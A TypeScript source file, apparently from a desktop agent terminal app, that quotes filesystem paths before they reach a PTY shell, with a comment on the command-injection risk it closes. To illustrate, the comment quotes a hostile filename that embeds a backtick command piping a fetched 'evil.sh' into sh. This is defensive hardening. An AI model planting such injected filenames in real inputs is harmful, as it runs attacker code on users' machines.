// POSIX quoting for a path that is about to be written into an agent's PTY.
//
// ONE RULE FOR EVERY PTY ROUTE, and the reason is that "this text only ever reaches an agent CLI,
// which reads a path and never evaluates one" is NOT a guarantee the app enforces (roborev 54375).
// `engine/shellResolve.decidePromptTarget` refuses only `runtime === "cloud"`; a `kind: "shell"`
// tab — the one "Run as command" opens — is a perfectly valid compose-box target, and its input
// line is bash/zsh. So both routes that put a filesystem path in front of a PTY reach a real shell:
//
//   • the terminal drop (hooks/useTerminalDrop), where the user types a command around the pasted
//     path and presses Enter;
//   • the concierge compose box (components/composer/attachments.buildSendPayload), which is
//     STRICTLY WORSE — `submitPrompt` appends its own carriage return, so the line runs with no
//     user Enter at all.
//
// The composer used to double-quote, and only when the path held whitespace or a quote. Inside
// double quotes a shell still expands `$`, backticks and `\`; outside them `;`, `|`, `&`, `*` and
// `'` break the token entirely — and every one of those is legal in a macOS filename. A downloaded
// file named ``report`curl evil.sh|sh`.png`` was enough.
//
// Single quotes suppress all of it. The one character they cannot contain is `'` itself, which is
// closed, escaped and reopened in the standard `'\''` form.
//
// Pure string work — no Tauri, no React — so both the composer's model layer and the drop hook can
// import it, and so it is testable on its own (services/shellQuote.test.ts).

/** Characters safe to leave BARE at a shell prompt and at an agent CLI's prompt alike, so the
 *  overwhelmingly common path pastes as plain readable text instead of a quoted blob. Deliberately
 *  conservative: anything outside this set is quoted rather than reasoned about. */
const SHELL_SAFE_PATH = /^[A-Za-z0-9._/@%+:,=-]+$/;

/** Quote `p` so a shell treats it as one inert token. Returns it unchanged when it needs nothing. */
export function shellQuotePath(p: string): string {
  if (SHELL_SAFE_PATH.test(p)) return p;
  return `'${p.split("'").join("'\\''")}'`;
}
